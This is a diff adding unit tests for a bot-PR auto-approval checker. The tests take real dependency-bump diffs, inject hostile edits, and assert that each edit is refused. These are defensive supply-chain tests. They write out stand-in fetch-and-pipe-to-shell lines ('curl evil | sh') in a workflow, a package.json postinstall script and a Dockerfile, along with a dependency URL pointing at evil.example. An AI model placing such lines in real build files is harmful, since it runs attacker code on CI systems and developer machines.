@@ -18,6 +18,7 @@ sys.path.insert(0, str(ROOT / "scripts"))
 import approve_bot_runs as abr  # noqa: E402
 
 FIXTURE = json.loads((ROOT / "tests" / "fixtures" / "approve_bot_runs_valid.json").read_text())
+PATCHES = json.loads((ROOT / "tests" / "fixtures" / "approve_bot_runs_patches.json").read_text())["cases"]
 
 
 class FakeApi:
@@ -193,6 +194,249 @@ class FleetParseTest(unittest.TestCase):
         text = 'const SELF_CONFIGURED = [\n];\nconst FLEET = [\n  "a/../b",\n];\n'
         with self.assertRaises(abr.FleetParseError):
             abr.parse_fleet(text)
+
+
+OLD_SHA = "1ffb2417032350ec1d31f0af400c25b225ee66ca"
+NEW_SHA = "57505751b27900e5d58fc0c2b40df32f18a2b980"
+CI_USES = "    uses: unified-systems-com/tap/.github/workflows/plugin-ci.yml@"
+
+
+def case(name: str) -> list[dict[str, Any]]:
+    return copy.deepcopy(PATCHES[name]["files"])
+
+
+def check(files: list[dict[str, Any]]) -> str | None:
+    return abr.check_files(files, len(files))
+
+
+def patch_of(files: list[dict[str, Any]], filename: str) -> dict[str, Any]:
+    return next(f for f in files if f["filename"] == filename)
+
+
+def edit(files: list[dict[str, Any]], filename: str, old: str, new: str) -> list[dict[str, Any]]:
+    f = patch_of(files, filename)
+    assert old in f["patch"], (filename, old)
+    f["patch"] = f["patch"].replace(old, new, 1)
+    return files
+
+
+def one_file(filename: str, patch: str, status: str = "modified") -> list[dict[str, Any]]:
+    return [{"filename": filename, "status": status, "patch": patch}]
+
+
+class RealShapesTest(unittest.TestCase):
+    """Every shape here is a real merged bot PR's diff (the fixture names each PR)."""
+
+    APPROVED = ("workflow_sha_bump", "workflow_long_comment", "workflow_main_pin", "workflow_main_pin_comment",
+                "workflow_tag_to_sha", "workflow_version_comment", "boot_commit", "dockerfile_digest",
+                "dockerfile_copy_from", "dockerfile_tag", "package_json", "pyproject_deps", "release_plugin")
+
+    def test_real_bot_diffs_pass(self) -> None:
+        for name in self.APPROVED:
+            with self.subTest(name):
+                self.assertIsNone(check(case(name)))
+
+    def test_real_release_pr_with_uv_lock_needs_a_human(self) -> None:
+        self.assertEqual(check(case("release_tap")), "needs a human look: uv.lock")
+
+    def test_real_release_pr_without_uv_lock_passes(self) -> None:
+        files = [f for f in case("release_tap") if f["filename"] != "uv.lock"]
+        self.assertIsNone(check(files))
+
+    def test_real_tag_to_tag_bump_refused(self) -> None:
+        self.assertIn("not moved to a 40-hex commit sha", check(case("workflow_tag_to_tag")) or "")
+
+    def test_whole_decision_with_real_patches_approves(self) -> None:
+        fx = copy.deepcopy(FIXTURE)
+        fx["files"] = case("workflow_main_pin")
+        self.assertTrue(decide(fx).approve)
+
+
+class HostileContentTest(unittest.TestCase):
+    """Each case is a real bot diff with one hostile edit; every one must be refused."""
+
+    def assertRefused(self, files: list[dict[str, Any]], fragment: str) -> None:
+        why = check(files)
+        self.assertIsNotNone(why, "hostile diff passed")
+        self.assertIn(fragment, why or "")
+
+    def test_workflow_extra_run_line(self) -> None:
+        files = edit(case("workflow_sha_bump"), ".github/workflows/ci.yml",
+                     f"+{CI_USES}{NEW_SHA}\n", f"+{CI_USES}{NEW_SHA}\n+    run: curl -s https://evil.example | sh\n")
+        self.assertRefused(files, "1 lines removed but 2 added")
+
+    def test_workflow_run_line_rewritten(self) -> None:
+        files = one_file(".github/workflows/ci.yml",
+                         "@@ -5,3 +5,3 @@ jobs:\n     steps:\n-      - run: make test\n+      - run: curl evil | sh\n")
+        self.assertRefused(files, "not a `uses:` line")
+
+    def test_workflow_uses_other_action(self) -> None:
+        files = edit(case("workflow_sha_bump"), ".github/workflows/ci.yml",
+                     f"+{CI_USES}", "+    uses: mallory/tap/.github/workflows/plugin-ci.yml@")
+        self.assertRefused(files, "changes more than its ref")
+
+    def test_workflow_uses_other_file_in_same_repo(self) -> None:
+        files = edit(case("workflow_sha_bump"), ".github/workflows/ci.yml",
+                     f"+{CI_USES}", "+    uses: unified-systems-com/tap/.github/workflows/evil.yml@")
+        self.assertRefused(files, "changes more than its ref")
+
+    def test_workflow_new_ref_is_a_tag(self) -> None:
+        files = edit(case("workflow_sha_bump"), ".github/workflows/ci.yml", f"+{CI_USES}{NEW_SHA}", f"+{CI_USES}v9.9.9")
+        self.assertRefused(files, "not moved to a 40-hex commit sha")
+
+    def test_workflow_new_ref_is_a_short_sha(self) -> None:
+        files = edit(case("workflow_sha_bump"), ".github/workflows/ci.yml", f"+{CI_USES}{NEW_SHA}", f"+{CI_USES}{NEW_SHA[:12]}")
+        self.assertRefused(files, "not moved to a 40-hex commit sha")
+
+    def test_workflow_permissions_change(self) -> None:
+        files = edit(case("workflow_sha_bump"), ".github/workflows/ci.yml",
+                     "       contents: read\n", "-      contents: read\n+      contents: write\n")
+        self.assertRefused(files, "not a `uses:` line")
+
+    def test_workflow_indentation_change(self) -> None:
+        files = edit(case("workflow_sha_bump"), ".github/workflows/ci.yml", f"+{CI_USES}", f"+  {CI_USES}")
+        self.assertRefused(files, "changes more than its ref")
+
+    def test_workflow_text_after_comment_changes(self) -> None:
+        files = edit(case("workflow_tag_to_sha"), ".github/workflows/trivy-nightly.yml",
+                     "# v7   # for .trivyignore", "# v7   # for .trivyignore\n+        run: curl evil")
+        self.assertIsNotNone(check(files))
+        files = edit(case("workflow_tag_to_sha"), ".github/workflows/trivy-nightly.yml",
+                     "# v7   # for .trivyignore", "# v7   # something else")
+        self.assertRefused(files, "trailing text changes beyond a version comment")
+
+    def test_workflow_only_added_line(self) -> None:
+        files = one_file(".github/workflows/ci.yml",
+                         f"@@ -5,2 +5,3 @@ jobs:\n {CI_USES}{OLD_SHA}\n+    secrets: inherit\n     with:\n")
+        self.assertRefused(files, "0 lines removed but 1 added")
+
+    def test_package_json_postinstall_added(self) -> None:
+        files = edit(case("package_json"), "package.json",
+                     '   "private": true,\n', '   "private": true,\n+  "scripts": {"postinstall": "curl evil | sh"},\n')
+        self.assertRefused(files, "0 lines removed but 1 added")
+
+    def test_package_json_change_inside_scripts(self) -> None:
+        files = one_file("package.json",
+                         '@@ -2,5 +2,5 @@\n   "name": "x",\n   "scripts": {\n-    "build": "1.0.0",\n+    "build": "1.0.1",\n'
+                         '     "test": "node t.js"\n')
+        self.assertRefused(files, "outside the dependency sections")
+
+    def test_package_json_dependency_to_a_git_url(self) -> None:
+        files = edit(case("package_json"), "package.json", '+    "cytoscape": "3.34.2",', '+    "cytoscape": "github:mallory/cytoscape",')
+        self.assertRefused(files, "not moved to a version")
+
+    def test_dockerfile_run_change(self) -> None:
+        files = one_file("Dockerfile", "@@ -10,3 +10,3 @@\n FROM x AS y\n-RUN apk add curl\n+RUN curl evil | sh\n")
+        self.assertRefused(files, "not a `FROM` or `COPY --from=` image line")
+
+    def test_dockerfile_from_switches_image(self) -> None:
+        files = edit(case("dockerfile_digest"), "Dockerfile",
+                     "+FROM cgr.dev/chainguard/wolfi-base:latest@", "+FROM docker.io/mallory/wolfi-base:latest@")
+        self.assertRefused(files, "changes its image, stage name or arguments")
+
+    def test_dockerfile_from_renames_stage(self) -> None:
+        files = case("dockerfile_digest")
+        f = patch_of(files, "Dockerfile")
+        lines = f["patch"].split("\n")
+        i = next(n for n, line in enumerate(lines) if line.startswith("+FROM"))
+        lines[i] = lines[i].replace(" AS ossl-builder", " AS base")
+        f["patch"] = "\n".join(lines)
+        self.assertRefused(files, "changes its image, stage name or arguments")
+
+    def test_dockerfile_digest_dropped(self) -> None:
+        files = one_file("Dockerfile", "@@ -1,1 +1,1 @@\n-FROM node:22-alpine@sha256:" + "a" * 64 + " AS js\n+FROM node:24-alpine AS js\n")
+        self.assertRefused(files, "not pinned by a sha256 digest")
+
+    def test_boot_record_url_change(self) -> None:
+        url = '          "url": "https://github.com/unified-systems-com/tap-plugin-compliance-core",'
+        files = one_file("boot/core_ci.boot.json",
+                         f"@@ -65,1 +65,1 @@\n-{url}\n+{url.replace('unified-systems-com', 'mallory')}\n")
+        self.assertRefused(files, "`url` changes")
+        files = edit(case("boot_commit"), "boot/core_ci.boot.json", f" {url}\n",
+                     f"-{url}\n+{url.replace('unified-systems-com', 'mallory')}\n")
+        self.assertIsNotNone(check(files))
+
+    def test_boot_record_commit_not_a_sha(self) -> None:
+        files = edit(case("boot_commit"), "boot/core_ci.boot.json",
+                     '+          "commit": "e5464e4dd87758d41552d45df42c0303b0de48e3"', '+          "commit": "main"')
+        self.assertRefused(files, "not a 40-hex sha")
+
+    def test_env_other_key(self) -> None:
+        files = edit(case("release_tap"), ".env", "-TAP_VERSION=0.1.2 # x-release-please-version\n+TAP_VERSION=0.1.3",
+                     "-TAP_WEB_IMAGE=ghcr.io/x\n+TAP_WEB_IMAGE=ghcr.io/mallory/x\n TAP_VERSION=0.1.2")
+        self.assertRefused(files, "not a value-only `TAP_VERSION=` move")
+
+    def test_env_version_outside_a_release_pr(self) -> None:
+        files = [patch_of(case("release_tap"), ".env")]
+        self.assertRefused(files, "outside a release-please PR")
+
+    def test_release_file_version_differs_from_manifest(self) -> None:
+        files = edit(case("release_plugin"), "tap_plugin/github_core/tap-plugin.toml",
+                     '+plugin_version = "0.12.2"', '+plugin_version = "9.9.9"')
+        self.assertRefused(files, "does not match the release manifest")
+
+    def test_missing_patch(self) -> None:
+        files = case("workflow_sha_bump")
+        del files[1]["patch"]
+        self.assertRefused(files, "no diff from GitHub for .github/workflows/nightly.yml")
+
+    def test_uv_lock_touched(self) -> None:
+        files = case("pyproject_deps") + [{"filename": "uv.lock", "status": "modified", "patch": "@@ -1 +1 @@\n-a\n+b"}]
+        self.assertRefused(files, "needs a human look: uv.lock")
+
+    def test_other_allowlisted_paths_need_a_human(self) -> None:
+        for name in ("package-lock.json", "renovate.json5", "release-please-config.json"):
+            with self.subTest(name):
+                self.assertRefused(one_file(name, "@@ -1 +1 @@\n-a\n+b"), f"needs a human look: {name}")
+
+    def test_changelog_with_removed_lines(self) -> None:
+        files = edit(case("release_tap"), "CHANGELOG.md", " # Changelog\n", "-# Changelog\n")
+        files = [f for f in files if f["filename"] != "uv.lock"]
+        self.assertRefused(files, "CHANGELOG.md has removed lines")
+
+    def test_changelog_outside_a_release_pr(self) -> None:
+        files = [patch_of(case("release_plugin"), "CHANGELOG.md")]
+        self.assertRefused(files, "CHANGELOG.md changes outside a release-please PR")
+
+    def test_changelog_below_the_top(self) -> None:
+        files = [f for f in case("release_tap") if f["filename"] != "uv.lock"]
+        f = patch_of(files, "CHANGELOG.md")
+        f["patch"] = "@@ -40,3 +40,4 @@\n x\n+* sneaky\n y\n"
+        self.assertRefused(files, "changed below its top")
+
+    def test_manifest_not_a_version(self) -> None:
+        files = edit(case("release_plugin"), ".release-please-manifest.json", '+  ".": "0.12.2"', '+  ".": "latest"')
+        self.assertRefused(files, "not a version")
+
+    def test_plugin_manifest_other_key(self) -> None:
+        files = one_file("tap_plugin/x/tap-plugin.toml", '@@ -3,1 +3,1 @@\n-requires_tap = ">=0.2.1"\n+requires_tap = ">=0.0.0"\n')
+        self.assertRefused(files, "`requires_tap` changes")
+
+    def test_plugin_manifest_sha256_refresh(self) -> None:
+        # Shape of duo-tap's [[boot.records]] digest line; no bot PR has changed one yet.
+        patch = '@@ -55,1 +55,1 @@\n-sha256 = "' + "b" * 64 + '"\n+sha256 = "' + "c" * 64 + '"\n'
+        self.assertIsNone(check(one_file("tap_plugin/duo/tap-plugin.toml", patch)))
+        self.assertRefused(one_file("tap_plugin/duo/tap-plugin.toml", patch.replace("c" * 64, "c" * 63)), "not 64 hex")
+
+    def test_pyproject_dependency_renamed(self) -> None:
+        files = edit(case("pyproject_deps"), "pyproject.toml", '+    "ruff>=0.16,<0.17",', '+    "rufff>=0.16,<0.17",')
+        self.assertRefused(files, "changes more than its version specifier")
+
+    def test_pyproject_url_dependency(self) -> None:
+        files = edit(case("pyproject_deps"), "pyproject.toml", '+    "ruff>=0.16,<0.17",', '+    "ruff @ https://evil.example/r.whl",')
+        self.assertRefused(files, "not a version specifier")
+
+    def test_pyproject_version_outside_a_release_pr(self) -> None:
+        files = [patch_of(case("release_tap"), "pyproject.toml")]
+        self.assertRefused(files, "outside a release-please PR")
+
+    def test_whole_decision_refuses_hostile_workflow(self) -> None:
+        fx = copy.deepcopy(FIXTURE)
+        fx["files"] = edit(fx["files"], ".github/workflows/ci.yml", f"+{CI_USES}{NEW_SHA}\n",
+                           f"+{CI_USES}{NEW_SHA}\n+    run: curl evil | sh\n")
+        d = decide(fx)
+        self.assertFalse(d.approve)
+        self.assertIn(".github/workflows/ci.yml", d.reason)
 
 
 if __name__ == "__main__":
